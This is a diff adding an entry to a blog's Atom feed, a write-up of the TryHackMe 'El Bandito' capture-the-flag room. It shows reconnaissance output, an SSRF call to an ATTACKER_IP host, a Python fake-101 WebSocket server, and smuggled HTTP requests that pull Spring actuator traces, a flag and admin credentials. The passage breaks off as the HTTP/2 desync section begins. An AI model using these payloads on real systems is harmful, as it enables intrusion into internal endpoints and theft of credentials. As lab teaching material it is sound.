@@ -2,9 +2,371 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
   <title>aviskase</title>
   <id>https://www.aviskase.com/</id>
-  <updated>2025-03-05T16:35:52Z</updated>
+  <updated>2025-03-13T21:08:05Z</updated>
   <link rel="self" type="application/atom+xml" href="https://www.aviskase.com/feeds/all.atom.xml" hreflang="en"/>
   <link rel="alternate" type="text/html" href="https://www.aviskase.com/" hreflang="en"/>
+  <entry>
+    <title>Writeup: TryHackMe El Bandito</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/03/13/writeup-tryhackme-el-bandito/" hreflang="en"/>
+    <published>2025-03-13T21:08:05Z</published>
+    <updated>2025-03-13T21:08:05Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-03-13:/articles/2025/03/13/writeup-tryhackme-el-bandito/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/room/elbandito" class="external-link">El Bandito</a></li>
+<li>Difficulty: hard</li>
+<li>Platform: web</li>
+</ul>
+<p>El Bandito, the new identity of the infamous Jack the Exploiter, has plunged into the Web3 domain with a devious token scam. By exploiting the decentralized essence of blockchain, he crafted and circulated fraudulent tokens, deceiving investors and shaking the foundational trust of the decentralized finance DeFi ecosystem.</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/room/elbandito" class="external-link">El Bandito</a></li>
+<li>Difficulty: hard</li>
+<li>Platform: web</li>
+</ul>
+<p>El Bandito, the new identity of the infamous Jack the Exploiter, has plunged into the Web3 domain with a devious token scam. By exploiting the decentralized essence of blockchain, he crafted and circulated fraudulent tokens, deceiving investors and shaking the foundational trust of the decentralized finance DeFi ecosystem.</p>
+<p>As we embark on this new challenge, it becomes clear that the stakes are higher than ever. To succeed, we must infiltrate his network, decode his strategies, and anticipate his moves before he can strike again.</p>
+<p>The mission has evolved: now, we must capture El Bandito. This requires a deep dive into the digital underworld, using cunning and technical skills to outmaneuver him and restore security.</p>
+<p>We request your help in smuggling all the flags.</p>
+<p>Answer the questions below</p>
+<ol>
+<li>Whats the first web flag?</li>
+<li>Whats the second web flag?</li>
+</ol>
+</div>
+<p>The room acts as a final step of HTTP smuggling module, so, explored vulnerabilities are not surprising:</p>
+<ul>
+<li>SSRF</li>
+<li>HTTP request smuggling via fake WebSocket tunnel</li>
+<li>HTTP request smuggling over HTTP 2 with CL.0 technique</li>
+</ul>
+<div class="callout toc">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a>
+      <ol>
+        <li><a href="#port-8080">Port 8080</a></li>
+        <li><a href="#port-80">Port 80</a></li>
+      </ol>
+    </li>
+    <li><a href="#establishing-a-fake-websocket-tunnel-via-ssrf">Establishing a fake WebSocket tunnel via SSRF</a></li>
+    <li><a href="#smuggling-http-request-to-get-the-first-flag">Smuggling HTTP request to get the first flag</a></li>
+    <li><a href="#http-2-cl0-desync-to-get-the-second-flag">HTTP 2 CL.0 desync to get the second flag</a></li>
+  </ol>
+</nav>
+</div>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>Port scan revealed two HTTP servers and a printing service (it is not used in this challenge).</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -sV -vv -n -T4 10.10.146.124
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE  REASON         VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh      syn-ack ttl <span style="color:#fab387">61</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; pro
+</span></span><span style="display:flex;"><span>tocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  ssl/http syn-ack ttl <span style="color:#fab387">60</span> El Bandito Server
+</span></span><span style="display:flex;"><span>631/tcp  open  ipp      syn-ack ttl <span style="color:#fab387">61</span> CUPS 2.4
+</span></span><span style="display:flex;"><span>8080/tcp open  http     syn-ack ttl <span style="color:#fab387">60</span> nginx
+</span></span></code></pre></div><h3 id="port-8080" >
+  <a href="#port-8080">Port 8080</a>
+</h3>
+<p>On port 8080 there is a landing page for Bandit-Coin. Only two links work: &ldquo;Services&rdquo; and &ldquo;Burn Token&rdquo;.</p>
+<p><img src="ctf_elbandito_8080_home.png" alt="8080 app home page"></p>
+<p>&ldquo;Services&rdquo; page shows status of related services.</p>
+<p><img src="ctf_elbandito_8080_services.png" alt="Service page showing offline status for websocket service and online status for public service"></p>
+<p>Status is checked via simple <code>GET</code> requests with service URL as a parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>GET /isOnline?url=http://bandito.public.thm
+</span></span><span style="display:flex;"><span>GET /isOnline?url=http://bandito.websocket.thm
+</span></span></code></pre></div><p>&ldquo;Burn Token&rdquo; page has a feature that doesn&rsquo;t work because it relies on WebSocket service which is currently down. Console shows a message that the service isn&rsquo;t working <em>on purpose</em>.</p>
+<p><img src="ctf_elbandito_burn_ws_error.png" alt="Burn Token page and Console pane with error messages"></p>
+<p>Directories enumeration with <code>gobuster</code> shows several useful endpoints.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...SNIP...
+</span></span><span style="display:flex;"><span>/trace <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/autoconfig <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/metrics <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/home <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/lang <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/pwd <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/beans <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/language <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/dump <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span></code></pre></div><p>With these (and rerunning <code>nmap</code> with scripts) I concluded that this web app is running Spring Java framework.</p>
+<h3 id="port-80" >
+  <a href="#port-80">Port 80</a>
+</h3>
+<p>Second service must be accessed via HTTPS only and supports HTTP 2. Main page is linking to a JavaScript file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ curl -ksi  https://10.10.146.124:80 
+</span></span><span style="display:flex;"><span>HTTP/2 200 
+</span></span><span style="display:flex;"><span>date: Thu, 06 Mar 2025 21:42:47 GMT
+</span></span><span style="display:flex;"><span>content-type: text/html; charset=utf-8
+</span></span><span style="display:flex;"><span>content-length: 58
+</span></span><span style="display:flex;"><span>content-security-policy: default-src &#39;self&#39;; script-src &#39;self&#39;; object-src &#39;none&#39;;
+</span></span><span style="display:flex;"><span>x-content-type-options: nosniff
+</span></span><span style="display:flex;"><span>x-frame-options: SAMEORIGIN
+</span></span><span style="display:flex;"><span>x-xss-protection: 1; mode=block
+</span></span><span style="display:flex;"><span>feature-policy: microphone &#39;none&#39;; geolocation &#39;none&#39;;
+</span></span><span style="display:flex;"><span>age: 0
+</span></span><span style="display:flex;"><span>server: El Bandito Server
+</span></span><span style="display:flex;"><span>accept-ranges: bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nothing to see &lt;script src=&#39;/static/messages.js&#39;&gt;&lt;/script&gt;
+</span></span></code></pre></div><p>File <code>messages.js</code> shows chat functionality and two endpoints:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#89dceb">document</span>.addEventListener(<span style="color:#a6e3a1">&#34;DOMContentLoaded&#34;</span>, <span style="color:#f38ba8">function</span> () {
+</span></span><span style="display:flex;"><span>	...SNIP...
+</span></span><span style="display:flex;"><span>	<span style="color:#f38ba8">function</span> fetchMessages() {
+</span></span><span style="display:flex;"><span>		fetch(<span style="color:#a6e3a1">&#34;/getMessages&#34;</span>)
+</span></span><span style="display:flex;"><span>			...SNIP...
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	...SNIP...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6c7086;font-style:italic">// Function to send a message to the server
+</span></span></span><span style="display:flex;"><span><span style="color:#6c7086;font-style:italic"></span>	<span style="color:#f38ba8">function</span> sendMessage() {
+</span></span><span style="display:flex;"><span>		...SNIP...
+</span></span><span style="display:flex;"><span>			fetch(<span style="color:#a6e3a1">&#34;/send_message&#34;</span>, {
+</span></span><span style="display:flex;"><span>				...SNIP...
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	...SNIP...
+</span></span></code></pre></div><p>Going to <code>/getMessages</code> redirects to the login form.</p>
+<p><img src="ctf_elbandito_80_signin.png" alt="Login form"></p>
+<h2 id="establishing-a-fake-websocket-tunnel-via-ssrf" >
+  <a href="#establishing-a-fake-websocket-tunnel-via-ssrf">Establishing a fake WebSocket tunnel via SSRF</a>
+</h2>
+<p>Knowing that the room is about HTTP smuggling, I was confident that I needed to <a href="https://github.com/0ang3el/websocket-smuggle" class="external-link">establish a fake WebSocket tunnel</a>. First, we need to trick the server to think that WebSocket service responds with 101 code. For that, I confirmed SSRF vulnerability in the status check API:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl -ksi <span style="color:#a6e3a1">&#39;http://MACHINE_IP:8080/isOnline?url=http://ATTACKER_IP:8000&#39;</span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#fab387">200</span> 
+</span></span><span style="display:flex;"><span>Server: nginx
+</span></span><span style="display:flex;"><span>Date: Thu, <span style="color:#fab387">06</span> Mar <span style="color:#fab387">2025</span> 21:57:55 GMT
+</span></span><span style="display:flex;"><span>Content-Type: text/plain
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#fab387">0</span>
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span></code></pre></div><p>Then I wrote a simple python server which responds with 101 code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#94e2d5">from</span> <span style="color:#fab387">http.server</span> <span style="color:#94e2d5">import</span> HTTPServer, BaseHTTPRequestHandler
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">class</span> <span style="color:#f9e2af">ExploitHandler</span>(BaseHTTPRequestHandler):
+</span></span><span style="display:flex;"><span>    <span style="color:#cba6f7">def</span> <span style="color:#89b4fa">do_GET</span>(<span style="color:#89dceb">self</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>log_request()
+</span></span><span style="display:flex;"><span>        <span style="color:#cba6f7">if</span> <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>path <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#a6e3a1">&#39;/ws&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>protocol_version <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#a6e3a1">&#34;HTTP/1.1&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>send_response(<span style="color:#fab387">101</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>end_headers()
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">print</span>(<span style="color:#a6e3a1">&#34;websocket request&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#cba6f7">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">print</span>(<span style="color:#a6e3a1">&#34;other&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">def</span> <span style="color:#89b4fa">run_server</span>(port<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">8000</span>):
+</span></span><span style="display:flex;"><span>    server_address <span style="color:#89dceb;font-weight:bold">=</span> (<span style="color:#a6e3a1">&#39;&#39;</span>, port)
+</span></span><span style="display:flex;"><span>    httpd <span style="color:#89dceb;font-weight:bold">=</span> HTTPServer(server_address, ExploitHandler)
+</span></span><span style="display:flex;"><span>    <span style="color:#89dceb">print</span>(<span style="color:#f38ba8">f</span><span style="color:#a6e3a1">&#34;Server running on port </span><span style="color:#a6e3a1">{</span>port<span style="color:#a6e3a1">}</span><span style="color:#a6e3a1">&#34;</span>)
+</span></span><span style="display:flex;"><span>    httpd<span style="color:#89dceb;font-weight:bold">.</span>serve_forever()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">if</span> <span style="color:#f5e0dc">__name__</span> <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#a6e3a1">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    run_server()
+</span></span></code></pre></div><p>And to confirm successful request smuggling I crafted a request to non-existing page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /toto HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div><h2 id="smuggling-http-request-to-get-the-first-flag" >
+  <a href="#smuggling-http-request-to-get-the-first-flag">Smuggling HTTP request to get the first flag</a>
+</h2>
+<p><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html" class="external-link">Spring web apps have several interesting endpoints</a>:</p>
+
+<blockquote>
+    <p>Certain Actuator endpoints can expose sensitive data or allow harmful actions:</p>
+<ul>
+<li><code>/dump</code>, <code>/trace</code>, <code>/logfile</code>, <code>/shutdown</code>, <code>/mappings</code>, <code>/env</code>, <code>/actuator/env</code>, <code>/restart</code>, and <code>/heapdump</code>.</li>
+</ul>
+</blockquote>
+<p>Smuggling request to <code>/trace</code> showed that there are two additional endpoints <code>/admin-creds</code> and <code>/admin-flag</code>.</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-1" id="tabs-1-0" checked="checked" />
+<label for="tabs-1-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /trace HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-1" id="tabs-1-1"  />
+<label for="tabs-1-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span> <span style="color:#fab387">101</span> 
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> nginx
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 21:10:50 GMT
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> upgrade
+</span></span><span style="display:flex;"><span>X-Application-Context<span style="color:#89dceb;font-weight:bold">:</span> application:8081
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span><span style="display:flex;"><span>Content-Type: application/json;charset=UTF-8
+</span></span><span style="display:flex;"><span>Transfer-Encoding: chunked
+</span></span><span style="display:flex;"><span>Date: Fri, 07 Mar 2025 21:10:50 GMT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>13bc
+</span></span><span style="display:flex;"><span>[{&#34;timestamp&#34;:1741381850617,&#34;info&#34;:{&#34;method&#34;:&#34;GET&#34;,&#34;path&#34;:&#34;/isOnline&#34;,&#34;headers&#34;:{&#34;request&#34;:{&#34;upgrade&#34;:&#34;WebSocket&#34;,&#34;connection&#34;:&#34;Upgrade&#34;,&#34;host&#34;:&#34;localhost:8002&#34;,&#34;sec-websocket-key&#34;:&#34;nf6dB8Pb/BLinZ7UexUXHg==&#34;,&#34;sec-websocket-version&#34;:&#34;13&#34;},&#34;response&#34;:{&#34;X-Application-Context&#34;:&#34;application:8081&#34;,&#34;Date&#34;:&#34;Fri, 07 Mar 2025 21:10:50 GMT&#34;,&#34;status&#34;:&#34;101&#34;}}}},{&#34;timestamp&#34;:1741381841023,&#34;info&#34;:{&#34;method&#34;:&#34;GET&#34;,&#34;path&#34;:&#34;/admin-creds&#34;,&#34;headers&#34;:{&#34;request&#34;:{&#34;host&#34;:&#34;0.0.0.0:8081&#34;,&#34;user-agent&#34;:&#34;Wget&#34;,&#34;connection&#34;:&#34;close&#34;},&#34;response&#34;:{&#34;X-Application-Context&#34;:&#34;application:8081&#34;,&#34;Content-Type&#34;:&#34;text/plain&#34;,&#34;Content-Length&#34;:&#34;55&#34;,&#34;Date&#34;:&#34;Fri, 07 Mar 2025 21:10:40 GMT&#34;,&#34;Connection&#34;:&#34;close&#34;,&#34;status&#34;:&#34;200&#34;}}}},{&#34;timestamp&#34;:1741381840973,&#34;info&#34;:{&#34;method&#34;:&#34;GET&#34;,&#34;path&#34;:&#34;/admin-flag&#34;,&#34;headers&#34;:{&#34;request&#34;:{&#34;host&#34;:&#34;0.0.0.0:8081&#34;,&#34;user-agent&#34;:&#34;Wget&#34;,&#34;connection&#34;:&#34;close&#34;},&#34;response&#34;:{&#34;X-Application-Context&#34;:&#34;application:8081&#34;,&#34;Content-Type&#34;:&#34;text/plain&#34;,&#34;Content-Length&#34;:&#34;43&#34;,&#34;Date&#34;:&#34;Fri, 07 Mar 2025 21:10:40 GMT&#34;,&#34;Connection&#34;:&#34;close&#34;,&#34;status&#34;:&#34;200&#34;}}}}, ...SNIP...]
+</span></span><span style="display:flex;"><span>0
+</span></span></code></pre></div></div>
+</div>
+<p>And smuggling request to <code>/admin-flag</code> reveals the first flag:</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-2" id="tabs-2-0" checked="checked" />
+<label for="tabs-2-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /admin-flag HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-2" id="tabs-2-1"  />
+<label for="tabs-2-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span> <span style="color:#fab387">101</span> 
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> nginx
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 21:16:46 GMT
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> upgrade
+</span></span><span style="display:flex;"><span>X-Application-Context<span style="color:#89dceb;font-weight:bold">:</span> application:8081
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span><span style="display:flex;"><span>Content-Type: text/plain
+</span></span><span style="display:flex;"><span>Content-Length: 43
+</span></span><span style="display:flex;"><span>Date: Fri, 07 Mar 2025 21:16:46 GMT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>THM{:::REDACTED:::}
+</span></span></code></pre></div></div>
+</div>
+<h2 id="http-2-cl0-desync-to-get-the-second-flag" >
+  <a href="#http-2-cl0-desync-to-get-the-second-flag">HTTP 2 CL.0 desync to get the second flag</a>
+</h2>
+<p>Credentials from <code>/admin-creds</code> can be used to login into chat application:</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-3" id="tabs-3-0" checked="checked" />
+<label for="tabs-3-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /admin-creds HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-3" id="tabs-3-1"  />
+<label for="tabs-3-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span> <span style="color:#fab387">101</span> 
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> nginx
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 21:15:49 GMT
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> upgrade
+</span></span><span style="display:flex;"><span>X-Application-Context<span style="color:#89dceb;font-weight:bold">:</span> application:8081
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span><span style="display:flex;"><span>Content-Type: text/plain
+</span></span><span style="display:flex;"><span>Content-Length: 55
+</span></span><span style="display:flex;"><span>Date: Fri, 07 Mar 2025 21:15:49 GMT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username:REDACTED password:REDACTED
+</span></span></code></pre></div></div>
+</div>
+<p><img src="ctf_elbandito_chat.png" alt="Chat page with several loaded messages"></p>
+<p>Having valid cookies I used <a href="https://github.com/PortSwigger/http-request-smuggler" class="external-link">HTTP Request Smuggler</a> Burp extension to confirm possibility of poisoning HTTP queue:</p>
